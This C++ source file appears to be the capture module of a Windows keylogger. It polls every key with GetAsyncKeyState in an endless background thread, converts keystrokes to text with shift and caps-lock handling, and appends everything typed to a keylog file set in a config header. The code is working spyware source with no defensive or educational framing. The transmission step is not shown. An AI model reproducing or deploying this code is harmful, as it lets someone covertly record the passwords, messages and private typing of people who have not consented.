#include "keylogger.h"
#include "utils.h"
#include "config.h"
#include <fstream>
#include <thread>
#include <chrono>

bool IsShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
}

bool IsCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

std::wstring GetKeyChar(int keyCode) {
    static bool shiftPressed = false;
    static bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    
    shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || 
                  (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || 
                  (GetAsyncKeyState(VK_RSHIFT) & 0x8000);

    bool uppercase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);

    switch (keyCode) {
        case VK_SPACE: return L" ";
        case VK_RETURN: return L"\n";
        case VK_BACK: return L"[BACKSPACE]";
        case VK_TAB: return L"[TAB]";
        case VK_SHIFT: return L"[SHIFT]";
        case VK_CONTROL: return L"[CTRL]";
        case VK_MENU: return L"[ALT]";
        case VK_CAPITAL: 
            capsLockOn = !capsLockOn;
            return L"[CAPSLOCK]";
        case VK_ESCAPE: return L"[ESC]";
        case VK_PRIOR: return L"[PAGEUP]";
        case VK_NEXT: return L"[PAGEDOWN]";
        case VK_END: return L"[END]";
        case VK_HOME: return L"[HOME]";
        case VK_LEFT: return L"[LEFT]";
        case VK_UP: return L"[UP]";
        case VK_RIGHT: return L"[RIGHT]";
        case VK_DOWN: return L"[DOWN]";
        case VK_INSERT: return L"[INSERT]";
        case VK_DELETE: return L"[DELETE]";
        case VK_NUMLOCK: return L"[NUMLOCK]";
        case VK_SCROLL: return L"[SCROLLLOCK]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_APPS: return L"[MENU]";
        case VK_SNAPSHOT: return L"[PRINTSCREEN]";
        case VK_PAUSE: return L"[PAUSE]";
    }

    if (keyCode >= 0x41 && keyCode <= 0x5A) {
        if (uppercase) {
            return std::wstring(1, (wchar_t)keyCode);
        } else {
            return std::wstring(1, (wchar_t)(keyCode + 32));
        }
    }

    if (keyCode >= 0x30 && keyCode <= 0x39) {
        if (shiftPressed) {
            switch (keyCode) {
                case 0x30: return L")";
                case 0x31: return L"!";
                case 0x32: return L"@";
                case 0x33: return L"#";
                case 0x34: return L"$";
                case 0x35: return L"%";
                case 0x36: return L"^";
                case 0x37: return L"&";
                case 0x38: return L"*";
                case 0x39: return L"(";
            }
        }
        return std::wstring(1, (wchar_t)keyCode);
    }

    if (keyCode >= VK_OEM_1 && keyCode <= VK_OEM_3) {
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        keyboardState[VK_SHIFT] = shiftPressed ? 0x80 : 0;
        keyboardState[VK_CAPITAL] = capsLockOn ? 0x01 : 0;
        
        WCHAR buffer[16];
        if (ToUnicode(keyCode, MapVirtualKey(keyCode, MAPVK_VK_TO_VSC), 
                     keyboardState, buffer, 16, 0) > 0) {
            return std::wstring(buffer);
        }
    }

    if (keyCode >= VK_NUMPAD0 && keyCode <= VK_NUMPAD9) {
        return std::wstring(1, (wchar_t)(L'0' + (keyCode - VK_NUMPAD0)));
    }

    switch (keyCode) {
        case VK_MULTIPLY: return L"*";
        case VK_ADD: return L"+";
        case VK_SUBTRACT: return L"-";
        case VK_DECIMAL: return L".";
        case VK_DIVIDE: return L"/";
    }

    if (keyCode >= VK_F1 && keyCode <= VK_F24) {
        return L"[F" + std::to_wstring(keyCode - VK_F1 + 1) + L"]";
    }

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    keyboardState[VK_SHIFT] = shiftPressed ? 0x80 : 0;
    keyboardState[VK_CAPITAL] = capsLockOn ? 0x01 : 0;
    
    WCHAR buffer[16];
    if (ToUnicode(keyCode, MapVirtualKey(keyCode, MAPVK_VK_TO_VSC), 
                keyboardState, buffer, 16, 0) > 0) {
        return std::wstring(buffer);
    }

    return L"[KEY:" + std::to_wstring(keyCode) + L"]";
}

void WriteToLog(const std::wstring& text) {
    std::wofstream logFile(wstring_to_string(Config::KEYLOG_FILE), std::ios_base::app);
    if (logFile.is_open()) {
        logFile << text;
        logFile.close();
        LogToFile("Wrote to keylog.txt: " + wstring_to_string(text));
    } else {
        LogToFile("Failed to open keylog.txt for writing");
    }
}

void KeyLogger() {
    LogToFile("Keylogger thread started");
    while (true) {
        if (!isRunning) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        for (int keyCode = 8; keyCode <= 255; keyCode++) {
            if (GetAsyncKeyState(keyCode) & 0x0001) {
                std::wstring keyChar = GetKeyChar(keyCode);
                WriteToLog(keyChar);
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}
